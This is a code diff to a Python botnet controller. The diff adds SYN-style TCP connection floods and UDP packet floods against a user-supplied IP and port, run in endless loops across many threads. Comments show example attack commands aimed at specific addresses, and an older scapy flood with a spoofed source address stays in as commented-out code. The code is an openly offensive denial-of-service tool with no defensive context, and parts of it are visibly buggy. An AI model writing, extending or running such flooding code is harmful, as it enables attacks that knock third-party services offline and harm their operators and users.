@@ -1,10 +1,11 @@
+from scapy.all import *
 from threading import Thread
 from time import sleep
 import ctypes, socket, sys
 import platform, signal
 from random import choice
 from typing import Union, Tuple
-from scapy.all import *
+
 
 class Colours:
 	def __init__(self): 
@@ -60,12 +61,13 @@ class Colours:
 class Server(Colours): # this class is create a server to control botnet
 
 	co=["green","lgreen","lightgreen","grey","red","lred","lightred","cyan","lcyan","lightcyan","blue","lblue","lightblue","purple","yellow","white","lpurple","lightpurple","orange"]
-	
+	run = False
 	def __init__(self):
 		super().__init__()
 		signal.signal(signal.SIGINT, self.exit_gracefully)
 		signal.signal(signal.SIGTERM, self.exit_gracefully)
 		self.print_logo()
+		self.run = False
 		# self.all_connections = []
 		# self.all_address = []
 		# self.stop = False
@@ -208,17 +210,83 @@ class Server(Colours): # this class is create a server to control botnet
 			sleep(0.5)
 	def dos_attack(self):
 		#input target IP and Port
-		destination_IP = input("Enter IP address of Target: ")
-		destination_port = int(input("Enter port of the target: "))
 
-		i = 1
-		while True:
-			#IP1 = IP(source_IP="192.168.1.48", destination="192.168.1.47")
-			#TCP1 = TCP(srcport="80", dstport=80)
-			send(IP(src="192.168.1.48", dst=destination_IP)/TCP(sport=80, dport=destination_port),loop=0,inter=0.0000001)
-			#send(IP(dst=target_IP)/TCP(dport=target_Port, flags="S"),loop=0,inter=0.0000001) #send tcp packet to target.
-			print("packet sent ", i)
-			i = i + 1
+		def _dos_attack_syn(destination_IP, destination_port, time:int):
+			BUFFER_SIZE = 60000
+			BUFFER_SIZE = bytes(BUFFER_SIZE)
+			i = 1
+			destination_port = int(destination_port)
+			# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			# s.connect((destination_IP, destination_port))
+			while True:
+				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+				s.connect((destination_IP, destination_port))
+				s.sendto(BUFFER_SIZE,(destination_IP, destination_port))
+				print("Sent Packet: ", i)
+				i = i + 1
+
+
+		def _dos_attack_udp(destination_IP, destination_port, time:int):
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			bytes = random._urandom(1024)  # random the size of udp packet .
+			s.connect((destination_IP, int(destination_port)))
+			i = 1
+			while True:
+				#if not self.run: break
+				#s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+				#s.connect((destination_IP, int(destination_port)))
+				s.sendto(bytes, (destination_IP, int(destination_port)))
+				#print("sent packet udp: ",i)
+				#i = i + 1
+			s.close()
+
+		help = "DoS with SYN Flood: attack dos syn <ip> <port> <time in second> <Thread>\n" + "DoS with UDP Flood: attack dos udp <ip> <port> <time in second> <Thread>\n"
+		print(help)
+		cmd = input("->>")
+		if "syn" in cmd:
+			#attack dos syn 27.64.57.85 1005 200 5000
+			#attack dos syn 192.168.1.48 443 200 5000
+			data = cmd.replace("attack dos syn ","").split(" ")
+			print(data)
+			ip, port, times, thread = data
+			data = ip, int(port), int(times), int(thread)
+			print(type(ip))
+			self.run = True
+			for a in range(int(thread)):
+				_dos_attack_syn(ip, port, times)
+			self.run = False
+		elif "udp" in cmd:
+			#attack dos udp 27.64.57.85 1005 200 5000
+			# attack dos udp 192.168.1.48 443 200 5000
+			data = cmd.replace("attack dos udp ", "").split(" ")
+			print(data)
+			ip, port, times, thread = data
+			data = ip, int(port), int(times), int(thread)
+			print(type(ip))
+			self.run = True
+			for a in range(int(thread)):
+				Thread(target=_dos_attack_udp, args= (ip, port, times)).start()
+				#print(threading.enumerate())
+			self.run = False
+			# Thread(target=_dos_attack_udp, args=(ip, port, times)).start()
+			# self.run = False
+
+
+		# destination_IP = input("Enter IP address of Target: ")
+		# destination_port = int(input("Enter port of the target: "))
+
+		# i = 1
+		# while True:
+		# 	#IP1 = IP(source_IP="192.168.1.48", destination="192.168.1.47")
+		# 	#TCP1 = TCP(srcport="80", dstport=80)
+		# 	send(IP(src="192.168.1.48", dst=destination_IP)/TCP(sport=80, dport=destination_port),loop=0,inter=0.0000001)
+		# 	#send(IP(dst=target_IP)/TCP(dport=target_Port, flags="S"),loop=0,inter=0.0000001) #send tcp packet to target.
+		# 	print("packet sent ", i)
+		# 	i = i + 1
+
+
+
+
 
 if __name__ == '__main__':
 	Server()
